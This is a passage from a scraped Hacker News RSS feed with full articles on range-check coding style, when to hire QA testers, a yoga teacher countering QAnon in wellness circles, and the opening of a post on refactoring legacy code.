            </description>
            <link>https://supervised.mljar.com/tutorials/random/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24546390</guid>
            <pubDate>Mon, 21 Sep 2020 17:56:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Standardize the Way You Write Your Range Conditionals]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24546387">thread link</a>) | @nvader
<br/>
September 21, 2020 | https://danverbraganza.com/writings/always-spell-your-range-checks-like-this | <a href="https://web.archive.org/web/*/https://danverbraganza.com/writings/always-spell-your-range-checks-like-this">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content" itemscope="" itemtype="http://schema.org/BlogPosting" itemid="always-spell-your-range-checks-like-this">
        
        <h2 itemprop="headline">Standardize the Way You Write Your Range Conditionals</h2>
        <p itemprop="about"><i>By always spelling your range conditionals start &lt;= index &lt; capacity, you make your code more easily grokkable and reduce the chance of errors.</i></p>
        <p>
        by  on <i itemprop="datePublished">2020-09-20</i></p>
        <p><span itemprop="articleBody">
          

<h2>An old memory resurfaces</h2>

<p>The other day I encountered the following lines of code during a review.</p>

<pre><code>if curr_page + 1 &gt;= total_pages:
   # curr_page is out of bounds, do something about it.
</code></pre>

<p>It took me a few seconds of mentally compiling and running through the code
before I could agree that it was correct. That moment of effort felt unfamiliar,
though faintly nostalgic, like hearing a song that was popular during high
school on the public address in a supermarket. And just like a one-hit wonder
from the nineties, range checks or conditionals ordered like these had vanished
from my personal landscape until this chance encounter.</p>

<p>When we first start programming, simply learning the concepts of loops and
stopping conditions is daunting enough. The skills required to optimize our code
for readability and long-term maintainability are not explicitly taught at this
point, and nor should they be, for risk of overburdening the student. A lucky
few of us might be exposed to well-crafted code, and pick up some of these
practices through copying the patterns we see. Even then, such practical
knowledge lacks the depth to convey why these patterns are useful. This means
that many programmers begin their professional life producing less-than-readable
code.</p>

<h2>Prevent Fencepost Errors with This One Weird Trick</h2>

<p>Over time, I had unconsciously learned that my code was less buggy and more
readable when I formatted my range conditionals a certain way. The right way, I
had found, was to spell them:</p>

<pre><code>start &lt;= index &lt; capacity
</code></pre>

<p>The foregoing snippet is in Python, and takes advantage of <a href="https://docs.python.org/3/reference/expressions.html#comparisons">comparison
chaining</a>. In
Go, this may look like:</p>

<pre><code>start &lt;= index &amp;&amp; index &lt; capacity
</code></pre>

<p>The key points are that:</p>

<ul>
<li>The comparands are ordered from left to right, in non-decreasing order, and</li>
<li>(for zero-based numbering): the check with the lower bound is always
less-than-equals, while the check with the upper bound is strictly-less-than.</li>
</ul>

<p>In these snippets, <code>start</code>, <code>index</code> and <code>capacity</code> are all meta-syntactic
variables, or stand-ins for the actual variable names in your own code.
Additionally, you may not need to have both sides of the range check. Your own
conditionals might look like:</p>

<pre><code>assert 0 &lt;= index # Checks that the index is at,
                  # or exceeds, the lower bound.
</code></pre>

<pre><code>for (i = 0;
    i &lt; 10;  \\ There is the high bound check.
      	     \\ We loop if the index is below it.
    i++) {
</code></pre>

<pre><code>while (pager.getCurrentPage() &lt; pager.getTotalPages()) {
</code></pre>

<pre><code>if !(start &lt;= i) {
   return nil, errors.New("i index too low.")
}
</code></pre>

<h2>The Benefits</h2>

<p>Why pay the effort of memorizing and applying a rule like this? Because, by
standardizing on this spelling, you can be more confident about the code you
write, and debug it at a glance.</p>

<p>The goal of formatting code the right way is to make mistakes look obvious.
Through repetition, you train your eyes to parse the code at a higher level than
just the individual tokens. <code>&lt;= i</code> and <code>i &lt;</code> become the <a href="https://en.wikipedia.org/wiki/Chunking_%28psychology%29">chunks</a> that you look
for, and any deviation from that pattern becomes something to be investigated
further, and/or commented upon.</p>

<p>Contrast this with the alternative. These are all valid ways, though less
readable, ways to spell <code>0 &lt;= i</code>:</p>

<pre><code>0 &lt;= i
-1 &lt; i
i + 1 &gt; 0
i &gt;= 0
!(i &lt; 0)
i &gt; -1
</code></pre>

<p>By failing to format this code in a standard way, we rob the reader of the
ability to pattern-match. Every reader then needs to parse each different
arrangment of a range check anew, both to make sense of the code, and to verify
that there are no errors. Testing the code that checks the bounds of loops is
notoriously difficult, and so we need all the help we can get in this regard.</p>

<h2>If i == done; break</h2>

<p>In conclusion,</p>

<ul>
<li>the spelling of the inequalities of your range conditionals has implications
for the readability and correctness of your code.</li>
<li>Always order your checks so that the lowest is to the left, and the largest is
to the right</li>
<li>Assuming zero-based indexing, use <code>&lt;=</code> on the low side</li>
<li>Assuming zero-based indexing, use <code>&lt;</code> on the high side</li>
</ul>

<p>Finally, I'll leave you with <a href="https://www.cs.utexas.edu/users/EWD/transcriptions/EWD08xx/EWD831.html">this article by E. W. Dijkstra, which makes use of these range conventions, and argues that numbering should start at 0</a>.</p>

        </span></p><section>
	  <h4>Other articles you may like</h4>
          <ul>
	    
            <li>
              <b><a href="https://danverbraganza.com/writings/the-empty-case-is-not-special">The Empty Case is not Special</a></b>
	      Instead of explicitly handling the empty case in functions, try this instead.
            </li>
            
            <li>
              <b><a href="https://danverbraganza.com/writings/zero-based-ordinals">Zero-based ordinals</a></b>
	      This is the televenth post of my blog.
            </li>
            
            <li>
              <b><a href="https://danverbraganza.com/writings/connect-four-in-3-lines-of-python">Connect Four implemented in 3 lines of Python</a></b>
	      A tiny implementation of Connect 4 on the terminal, with explanation.
            </li>
            
          </ul>
	</section>
	
	
	<section>
	This article was filed under:
	<p><span>Programming</span>  <span>Craft</span> 
	</p>
	</section>
	
      </div></div>]]>
            </description>
            <link>https://danverbraganza.com/writings/always-spell-your-range-checks-like-this</link>
            <guid isPermaLink="false">hacker-news-small-sites-24546387</guid>
            <pubDate>Mon, 21 Sep 2020 17:56:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Signposts for “when to hire more QA testers”]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 56 (<a href="https://news.ycombinator.com/item?id=24546260">thread link</a>) | @ohjeez
<br/>
September 21, 2020 | https://www.functionize.com/blog/8-ways-to-know-that-its-time-to-hire-a-new-qa-tester/ | <a href="https://web.archive.org/web/*/https://www.functionize.com/blog/8-ways-to-know-that-its-time-to-hire-a-new-qa-tester/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><img width="1080" height="634" src="https://3laqvw22wekb3ykm8z4dbnq8-wpengine.netdna-ssl.com/wp-content/uploads/2020/09/ft-time-to-hire-new-QA-tester.jpg" alt="8 ways to know that it’s time to hire a new QA tester" srcset="https://www.functionize.com/wp-content/uploads/2020/09/ft-time-to-hire-new-QA-tester.jpg 1080w, https://www.functionize.com/wp-content/uploads/2020/09/ft-time-to-hire-new-QA-tester-300x176.jpg 300w, https://www.functionize.com/wp-content/uploads/2020/09/ft-time-to-hire-new-QA-tester-1024x601.jpg 1024w, https://www.functionize.com/wp-content/uploads/2020/09/ft-time-to-hire-new-QA-tester-768x451.jpg 768w" sizes="(max-width: 1080px) 100vw, 1080px">      </p>	  
    
        <blockquote><p>You want top-quality software, sure. But when is it time to increase the size of the testing team, so that you can deliver said top-quality software? Glad you asked.</p></blockquote>
<p>QA testers are part investigative reporter, part janitor—and all important to the user experience. That’s because the testers’ role is to hunt for untidy coding and to ensure that any user interaction with your software is free from error. As a result, every company worth its engineering chops knows it needs QA testers to do this crucial, sometimes dirty, work. The issue is: When do you bring on new people? How do you know it’s time to hire another QA professional?</p>
<p>In a perfect world, there would be a formula, like “hire one software tester for every five developers,” that is, runs <code>numQATesters = (numDevs+numFeatures)/(5+weWroteTests)</code>. But as life (and code) is imperfect, I came up with a few simple guidelines to justify your budget request.</p>
<p>Don’t thank me. A streamlined user experience is thanks enough.&nbsp;Particularly when it’s <em>your</em> software that I’m using.</p>
<h3>When your software is buggy</h3>
<p>Bugs are annoying yet inevitable errors that range from low priority (font change, alignment issues in text) to “Call the crisis PR team, stat!” (such as loss or exposure of data). And as we all know, a single critical flaw can result in customer dissatisfaction and a high bill from your crisis PR team. Or from the lawyers.</p>
<p>Jennifer Willy, editor of <a href="https://etia.com/" target="_blank" rel="noopener noreferrer">Etia.com</a>, considers bug complaints and customer issues a call to action, where the action is hiring a new QA tester. “User experience is vital. When you are faced with a situation like this, it is important to rely on good testers.” Hiring excellent testing staff both helps you <a href="https://www.functionize.com/blog/6-ways-to-improve-your-debugging-skills/">unravel the buggy situation</a> and also brings about a positive change in the software development process, Willy says.</p>
<p>(Of course, the lack of testers is one possible reason the software got into that sorry state. But that’s another discussion.)</p>
<p><em>Recommended hire</em>: A careful QA tester who can find bugs and other errors that the development team has overlooked. A QA with the patience of a saint, specifically Saint Monica, the saint most associated with patience.</p>
<h3>When your QA team is backlogged</h3>
<p>Christian Lavender, chief product officer of vehicle refinancing platform <a href="https://www.rategenius.com/" target="_blank" rel="noopener noreferrer">RateGenius</a>, says that it’s time to take on a new team member when QA can’t keep up with developer output. “You can hire more engineers to get projects built faster, but if your team doesn’t have the bandwidth to test releases, they’ll just sit in the QA backlog.”</p>
<p>If your developers produce more code than you can thoroughly test in a reasonable amount of time before your QA team drowns in <a href="https://www.functionize.com/blog/the-icky-sticky-tale-of-test-case-management/">a sea of test cases</a>, it’s time to consider pinging HR. Do so sooner rather than later, because as Lavender says, “When there’s a bottleneck in QA, it ripples across the company.”</p>
<p><em>Recommended hire</em>: An octopus. During crunch time, eight hands are better than two.</p>
<h3>When your QA staff is overworked</h3>
<p>If your QA department is working overtime, on weekends, and are called in during holidays, it means they’re handling an unusually heavy load. And if you overwork your QA staff, there’s no telling if your application’s name fields will accept <a href="https://www.cnet.com/news/how-elon-musk-pronounces-x-ae-a-12-his-new-sons-name/" target="_blank" rel="noopener noreferrer">user names like “X Æ A-12.”</a></p>
<p>“If you find that you’re spending more and more time testing than necessary, then you know it might be worth considering hiring a new QA tester,” says <a href="https://www.linkedin.com/in/colinlma/">Colin Ma</a>, founder of Makujin Media and a former director of engineering.</p>
<p><em>Recommended hire</em>: A QA tester who knows how to tap out when pinned to a wrestling mat.&nbsp;A QA who would never name their child X AE A-12.</p>
<h3>When you expand your application platforms</h3>
<p>Your QA team excels at what it does, and what it does is testing desktop software. But what happens <a href="https://www.functionize.com/blog/the-mobile-testing-gotchas-you-need-to-know-about/">when your users access your site on their cell phones</a>?</p>
<p>Your customer base should drive your next hire, says Lavender. “What devices do they use? What browser versions are they on? Are they on tablet, mobile, or desktop? Looking at all those breakdowns would drive you to the methods your QA team would use and what the specialties they would need.”</p>
<p><em>Recommended hire</em>: Someone who specializes in banking apps on iOS devices from versions 10 to 13 using Firefox versions 78 through 82, but only on Tuesdays during a full moon. Someone who <a href="https://www.functionize.com/blog/what-testers-should-know-about-domain-knowledge/">specializes in every other testing scenario</a>, too.</p>
<h3>When your QA team asks you to</h3>
<p>You’re in the software planning phase, and the project manager is laying out the scope of work. Joining you in the room is your QA team lead. Looking at the project, they say it straight up: “We need to hire more testers.”</p>
<p>Egor Bulyhin, project manager and team lead at consulting firm <a href="https://smart-it.com/" target="_blank" rel="noopener noreferrer">Smart IT</a>, says a good QA professional lets you know when work is beyond even their leet skillz. Part of a professional’s skill set is knowing their own limitations, including when they need more people to maintain a steady flow of approved features. It’s up to you to see that they get what they need (unless they need an early retirement).</p>
<p><em>Recommended hire</em>: A QA tester who isn’t afraid to tell you that you need a new hire. A QA tester who isn’t afraid to tell you that your fly is unzipped.</p>
<h3>When you need to keep your customer’s data secure</h3>
<p>Some testing specialties are less about platforms than reliability – including software security. Do you have someone qualified to find application vulnerabilities during testing?</p>
<p>When it comes to sensitive information, you need a higher level of either data or application integrity, Ma says. “One issue could be costly.” Issues include breach of trust or regulatory infractions that result in fines. If your product requires rock-solid data integrity, such as banking applications, you need a tester with relevant experience.</p>
<p>Even if you’re outside a regulatory regime, like the EU’s GDPR, you may still need to comply with it if you support EU customers. Also, have you ever read the term “data breach” in a feel-good piece? No, I didn’t think so.</p>
<p><em>Recommended hire</em>: Someone who knows what the acronym <a href="https://gdpr-info.eu/" target="_blank" rel="noopener noreferrer">GDPR</a> stands for. Someone who winces when you say “<a href="https://www.scmagazine.com/home/security-news/whats-really-changed-three-years-after-equifax-breach/" target="_blank" rel="noopener noreferrer">Equifax</a>.”</p>
<h3>When you need someone in a leadership position</h3>
<p>Let’s say your QA team has been working together for months, and each member excels at the job they’ve always done. But the work is piecemeal, with no cohesion or strategy. It’s time to hire someone with leadership abilities.</p>
<p>Jessica Salter, people operations manager of <a href="https://www.bestresponsemedia.co.uk/" target="_blank" rel="noopener noreferrer">Best Response Media</a>, needed someone who could create guidelines for future best practices. In making the hire, the key attribute was finding someone in a leadership position “to help us establish a strategy and implement new ways of working.” This particular hire should have management experience, to mentor the current QA team and set them up for future success.</p>
<p><em>Recommended hire</em>: Someone who has a plan for future strategies. And might know future lottery numbers.</p>
<h3>When your business is growing</h3>
<p>Maybe your application is getting new functionality. Or perhaps you’re developing an entire new product line. Or your business is among those <a href="https://www.nytimes.com/2020/09/08/style/guitar-sales-fender-gibson.html?fbclid=IwAR39kZlhJCKPqaUmzO9Ix18hFklDs-dnN1M7-yytGPT7EPD6Z4e4drgUY7E" target="_blank" rel="noopener noreferrer">getting a sales boost due to the pandemic</a>, which means it’s time to take on long-delayed projects.</p>
<p>Whatever the reason: On your to-hire list are several new developers. Make sure you add to this list a new QA professional, or you may experience that deadline-slaying backlog mentioned above.</p>
<p>Bulyhin likes to hire QA staff members before a new project begins, so he can onboard them before work ramps up in earnest. More importantly, he works with them to <a href="https://www.functionize.com/blog/the-best-qa-job-interview-questions-for-managers-to-ask/">make sure the new QA hire</a> has the skills they need for this particular job. This way, they both can achieve their work goals.</p>
<p>Recommended hire: Someone who has been there, done that, and <a href="https://duckduckgo.com/?q=%2522quality+assurance%2522+t-shirts&amp;atb=v63-1&amp;iar=images&amp;iax=images&amp;ia=images" target="_blank" rel="noopener noreferrer">has the t-shirts</a>. Very likely, the t-shirt reads, “A QA tester walks into a bar. Orders a beer. Orders 3.33 beers. Orders null beers. Orders &amp;@% beers.”</p>
<blockquote><p>Whomever you hire, surely you want someone with a steady grasp on <a href="https://www.functionize.com/project/getting-started-with-test-automation/">test automation essentials</a>? Our white paper gives you the basics.</p></blockquote>
<div>
<div>
<p><img src="https://3laqvw22wekb3ykm8z4dbnq8-wpengine.netdna-ssl.com/wp-content/uploads/2020/01/author-Carol-Pinchefsky.jpg"></p>
<div>
<p>by Carol Pinchefsky</p>
<p>Carol Pinchefsky is a freelance writer who writes about technology, science, and geek culture. She lives in New York City with her husband and their books. She can also be found on <a href="https://twitter.com/CarolPinchefsky"> Twitter</a>, <a href="https://www.facebook.com/CarolPinchefsky/">Facebook</a> and <a href="http://carolpinchefsky.com/">carol pinchefsky.com</a></p>
</div>

</div>
</div>
  </div></div>]]>
            </description>
            <link>https://www.functionize.com/blog/8-ways-to-know-that-its-time-to-hire-a-new-qa-tester/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24546260</guid>
            <pubDate>Mon, 21 Sep 2020 17:43:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Yoga instructor is fighting the rise of QAnon in the wellness community]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24546235">thread link</a>) | @colinprince
<br/>
September 21, 2020 | https://www.cbc.ca/radio/asithappens/this-yoga-instructor-is-fighting-the-rise-of-qanon-in-the-wellness-community-1.5728153 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/radio/asithappens/this-yoga-instructor-is-fighting-the-rise-of-qanon-in-the-wellness-community-1.5728153">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Seane Corn never thought her duties as yoga instructor would one day include warning&nbsp;people about the dangers of international right-wing conspiracy theories.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5728482.1600375194!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/seane-corn.jpg"></p></div><figcaption>Seane Corn is an L.A. yoga teacher and Instagram influencer who is part of pushback against proliferation of QAnon conspiracy theories in the wellness space. <!-- --> <!-- -->(Norman Seeff)</figcaption></figure><p><span></span><span>Listen</span><span>7:02</span></p><p><span><p><a href="https://www.cbc.ca/radio/asithappens/as-it-happens-thursday-edition-1.5728151/september-17-2020-episode-transcript-1.5730632">Read Story Transcript</a></p>  <p>Seane Corn never thought her duties as yoga instructor would one day include warning&nbsp;people about the dangers of an international right-wing conspiracy theory.</p>  <p>The Los Angeles&nbsp;yoga teacher is one of several high-profile&nbsp;Instagram influencers using their platforms to combat the rise of the QAnon conspiracy theory in wellness spaces.&nbsp;</p>  <p>"I just didn't think that I would be having to talk about things like a cabal of people in the U.S. that are kidnapping children and drinking their blood to gain power," Corn told <em>As It Happens </em>host Carol Off.</p>  <p>"I never thought that this would be a conversation I would have to have with my community to say, like, 'This isn't true. This isn't happening. Please use more discernment.'"</p>    <p>QAnon&nbsp;is a conspiracy theory that&nbsp;posits that&nbsp;U.S. President Donald Trump is secretly fighting an international&nbsp;cabal of Satan-worshipping, leftist elites&nbsp;who are&nbsp;running a global child sex trafficking&nbsp;ring.</p>  <p>It tends to overlap with conspiracy theories that involve anti-vaccination and anti-mask beliefs, and has roots in anti-Semitism and white supremacy.&nbsp;</p>  <p>Once relegated to the fringes of the internet, QAnon has&nbsp;recently made its way into more mainstream spaces. QAnon supporter&nbsp;Marjorie Taylor Greene recently<a href="https://www.cbc.ca/news/world/us-primaries-greene-omar-1.5683022a"> won the Republican nomination in Georgia's primary race</a>, and the president himself has referred to the conspiracy theory's followers <a href="https://www.nytimes.com/2020/08/19/us/politics/trump-qanon-conspiracy-theories.html">as people who "love our country."</a></p>    <p>But it's also started gaining&nbsp;significant traction among people who are into wellness,&nbsp;yoga, spirituality&nbsp;and alternative medicine.</p>  <p><em>Conspirituality,</em> a podcast that examines the links between wellness and conspiracy, has curated a list&nbsp;<a href="https://conspirituality.net/redpilled/">of more than two dozen wellness influencers</a> who have alluded to QAnon in their posts.&nbsp;</p>  <p>Corn says she started to notice it creeping into her social media feed at the start of the pandemic, with its followers&nbsp;using "yoga speak" and wellness branding to radicalize people online.&nbsp;</p>  <p>"The colours might be pastel. The fonts are very specific. There's maybe one post of someone doing yoga. Then the next day it's their food. The next day, it's a lifestyle shot," she said.</p>  <p>"But on maybe the fourth day, there's going to be a post that says, you know, very prettily "COVID is a hoax" and then a bunch of slides that keep giving misinformation and invite you to another link that then gives you more misinformation."</p>  <h2>'Magical thinking'&nbsp;</h2>  <p>For Corn, the conspiracy theory's proliferation in her community is not all that surprising.&nbsp;</p>  <p>"In the wellness community, there's often a lot of magical thinking," she said.</p>  <p>For example, she says people may turn to&nbsp;crystals or prayer as a Band-Aid solution for their life's problems, without engaging with those problems on a deeper level.&nbsp;</p>  <p>"I think that some of the messaging in QAnon&nbsp;is appealing to magical thinking. People are afraid. Their instincts are telling them that there's something else going on, but 'I just don't know what it is. I think I'm being lied to,'" she said.</p>  <p>"Someone is coming in and saying, 'Actually, you are,' and taking them down this rabbit hole."</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5727102.1600292087!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/qanon-in-quebec.jpg 300w,https://i.cbc.ca/1.5727102.1600292087!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/qanon-in-quebec.jpg 460w,https://i.cbc.ca/1.5727102.1600292087!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/qanon-in-quebec.jpg 620w,https://i.cbc.ca/1.5727102.1600292087!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/qanon-in-quebec.jpg 780w,https://i.cbc.ca/1.5727102.1600292087!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/qanon-in-quebec.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5727102.1600292087!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/qanon-in-quebec.jpg"></p></div><figcaption>Protesters hold a sign with a QAnon slogan at an anti-mask protest in Montreal. <!-- --> <!-- -->(Jonathan Montpetit/CBC)</figcaption></figure></span></p>  <p>Ali Breland,&nbsp;a reporter for Mother Jones who has been covering the overlap between QAnon and wellness, agrees.</p>  <p>He <a href="https://www.cbc.ca/radio/day6/funding-confusion-for-first-nations-schools-qanon-wellness-the-mulan-legend-bring-it-on-turns-20-and-more-1.5711574/qanon-has-found-a-home-among-wellness-influencers-and-new-audiences-says-reporter-1.5711585">told&nbsp;CBC Radio's<em> Day 6 </em>earlier this month</a>&nbsp;that wellness communities were already rife with anti-vaccination sentiment.</p>  <p>"[It's the idea that] these big powerful interests — these external interests that are beyond us, like Big Pharma, that we can't conceptualize, are trying to hurt our children ... and we need to protect them because no one else will," she said.&nbsp;</p>  <p>"That's the prevailing belief of QAnon."</p>    <blockquote><span><span><svg version="1.1" focusable="false" x="0px" y="0px" width="30px" height="25px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g><g><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g display="none"><g display="inline"> <path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg>There's a lot of women in this community who are sensitive and empathic. And so you bring in, you know, victimized children and you're going to appeal to that part of them that wants to do something, that wants to engage.'<svg focusable="false" x="0px" y="0px" width="23px" height="22px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g display="none"><g display="inline"><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g><g><path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg></span><cite>- Seane Corn</cite></span></blockquote>    <p>Annie Kelly, a researcher who studies digital extremism,&nbsp;<a href="https://www.nytimes.com/2020/09/10/opinion/qanon-women-conspiracy.html">recently wrote in the New York Times</a> that QAnon's "ranks are populated by a noticeably high percentage of women."</p>  <p>While suburban moms with yoga mats might not be the first image that pops into most people's minds&nbsp;when they think about online&nbsp;conspiracy theorists, Corn says it actually makes a lot of sense — especially as QAnon followers&nbsp;flood hashtags like #SaveTheChildren.&nbsp;</p>  <p>"There's a lot of women in this community who are sensitive and empathic. And so you bring in, you know, victimized children and you're going to appeal to that part of them that wants to do something, that wants to engage," Corn said.</p>  <h2>Risks of speaking out&nbsp;</h2>  <p>Corn, with her 100,000 Instagram followers, is trying to stem the tide by sharing posts that attempt to neutralize the disinformation.</p>  <p>Others are also heeding the call. Shannon Algeo, a&nbsp;L.A. yoga and meditation teacher with 25,000 followers, is one of several influencers who shared an Instagram post&nbsp;taking&nbsp;stand against the QAnon movement.</p>  <p>"I have a community that stands behind me, or rather stands with me," Corn said.&nbsp;"I'm not alone in this effort."</p>    <p>It's the kind of stance that could, at best, cost them some of their followers and income, and at worst, invite harassment and even violence.</p>  <p>Last week, a Texas&nbsp;woman was charged with&nbsp;aggravated assault with a deadly weapon after she&nbsp;<a href="https://wacotrib.com/news/local/crime-and-courts/affidavit-drunk-driver-who-rammed-car-claimed-to-be-chasing-pedophile/article_5989fa98-49fb-5db1-a5f2-2cef7a42e009.html">struck two strangers with her car</a>. According to the arrest affidavits, she believed they were pedophiles. Two people who knew her <a href="https://www.rightwingwatch.org/post/texas-qanon-car-attack-cecilia-fulbright/">told the website Right Wing Watch</a> she followed&nbsp;QAnon&nbsp;content&nbsp;online and sent them pro-QAnon&nbsp;messages.</p>  <p>Still, Corn says she has to speak out. She's already done interviews <a href="https://www.nytimes.com/2020/09/15/technology/yoga-teachers-take-on-qanon.html">with the New York Times</a>, <a href="https://www.rollingstone.com/culture/culture-news/qanon-wellness-influencers-seane-corn-yoga-1059856/">Rolling Stone </a>and more.&nbsp;</p>  <p>"I would feel worse being silent. That would make me complicit, and I just can't live with myself in that way,"&nbsp;she said. "So, hopefully, I'll remain safe and we'll see what happens."</p>  <hr>  <p><em>Written by Sheena Goodyear. Interview produced by Chloe Shantz-Hilkes.&nbsp;</em></p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/radio/asithappens/this-yoga-instructor-is-fighting-the-rise-of-qanon-in-the-wellness-community-1.5728153</link>
            <guid isPermaLink="false">hacker-news-small-sites-24546235</guid>
            <pubDate>Mon, 21 Sep 2020 17:41:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When should you stop refactoring Legacy Code?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24545911">thread link</a>) | @nicoespeon
<br/>
September 21, 2020 | https://understandlegacycode.com/blog/when-should-you-stop-refactoring-legacy-code/ | <a href="https://web.archive.org/web/*/https://understandlegacycode.com/blog/when-should-you-stop-refactoring-legacy-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When you work with Legacy Code, things can quickly get out-of-hand.</p><p>Sometimes you dive into the code with a clear goal in mind… 3 hours later you’re still trying to break a problematic dependency and have completely lost track of why you were here in the first place!</p><p><img src="https://understandlegacycode.com/assets/lost-in-field.jpg"></p><p>I recently experienced such a situation. Fortunately, I was mindful enough to apply the great advice I learned from others. It saved me a lot of time. I thought it would be a good story to share 🍷</p><h2 id="have-a-plan"><a href="#have-a-plan" aria-label="have a plan permalink"></a>Have a plan</h2><p>I’m working at <a href="https://busbud.com/">Busbud</a>. Every quarter or so, we have what we call our “Sustainability Week”.</p><p>During this week, engineers from all teams work together. We do maintenance tasks. We pay off some Technical Debt. Ideally, things that are cross-teams concerns. It’s a moment for engineers to just focus on improving their environment, while product managers discuss the next great ideas for the company.</p><p><strong>It’s great, I recommend doing something similar</strong> 👍</p><p>This week was a <em>short</em> week: the Monday was off, and I took my Wednesday off to organize <a href="https://twitter.com/nicoespeon/status/1303656226698539008">a remote conference on Legacy Code</a>. Demos were on Friday, so that gave me around 2 days to find, fix, and ship something.</p><p><img src="https://understandlegacycode.com/37f584dcb85dabd5cbafe6833c5b237f/gonna-be-fine.gif" alt="It's gonna be fine!"></p><p>Hopefully, I keep track of things I want to improve as I work on our codebase every day. A good candidate at the top of my list was:</p><blockquote><p>“Clean up the DB between each test”</p></blockquote><p>We have roughly 5,200 integrated tests for this codebase. Most of them involve the database. I realized that developers had to think about cleaning up the database after tests execute, so the next ones wouldn’t be impacted by previous test data.</p><p>Cleaning up the database can be tricky because of foreign key constraints: you have to clean up the tables in a specific order. I noticed that each developer was trying to figure it out for the tests they wrote. What a waste of time!</p><p>My plan was simple: <strong>automatically clean up the database between each test</strong>. That would have 3 benefits:</p><ol><li>People wouldn’t have to think about it, faster development!</li><li>Each test would be independent, less time spent in debugging failures!</li><li>There would be only one place to maintain for cleaning up tables in the correct order.</li></ol><p>I knew that execution shouldn’t be too hard: we’re using <a href="https://mochajs.org/">mocha</a> and we can run hooks before each test.</p><p>I had a plan. It was great. I presented it and everybody was excited to see the results 🌈</p><h2 id="everybody-has-a-plan-until-they-get-punched-in-the-mouth"><a href="#everybody-has-a-plan-until-they-get-punched-in-the-mouth" aria-label="everybody has a plan until they get punched in the mouth permalink"></a>“Everybody has a plan until they get punched in the mouth”</h2><p>On the first day, I started executing my plan. Everything went fine:</p><ul><li>I created the hook</li><li>I resolved the order in which tables should be cleaned</li><li>I tried the hooks and it worked!</li><li>I started deleting some (now useless) code from tests</li></ul><p>Then, I ran the whole test suite.</p><p><strong>Around 2,700 tests fail 💥</strong></p><p>It turns out that more than half of our tests <em>depend</em> on the data being persisted between tests. Clean up the database in between and they will start falling like dominos!</p><p><undefined>
